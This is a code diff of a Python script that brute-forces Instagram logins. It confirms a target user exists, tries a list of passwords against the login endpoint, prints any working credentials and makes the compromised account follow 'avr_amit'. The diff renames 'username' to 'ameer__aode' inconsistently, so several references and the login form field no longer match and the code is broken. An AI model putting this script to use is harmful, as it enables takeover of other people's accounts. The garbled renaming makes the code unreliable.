@@ -16,18 +16,18 @@ else:
 
 
 
-def userExists(username):
-	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+def userExists(ameer__aode):
+	r = requests.get('https://www.instagram.com/%s/?__a=1' % ameer__aode) 
 	if (r.status_code == 404):
 		print ('User not found')
 		return False
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'ameer__aode':ameer__aode,'id':fUserID}
 
 
-def Login(username,password):
+def Login(ameer__aode,password):
 	sess = requests.Session()
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'ameer__aode':ameer__aode, 'password':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -72,17 +72,17 @@ def follow(sess, username):
 	if (username == False):
 		return	
 	else:
-		userID = username['id']
+		userID = ameer__aode['id']
 		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
-if (username == False):
+ameer__aode = str(input('Please enter a ameer__aode: '))
+ameer__aode = userExists(ameer__aode)
+if (ameer__aode == False):
 	exit()
 else:
-	username = username['username']
+	ameer__aode = ameer__aode['ameer__aode']
 
 
 
@@ -93,7 +93,7 @@ for i in range(len(passwords)):
 	password = passwords[i]
 	sess = Login(username,password)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [ameer__aode,password])
 
 		#because i am cool
 		follow(sess,'avr_amit')
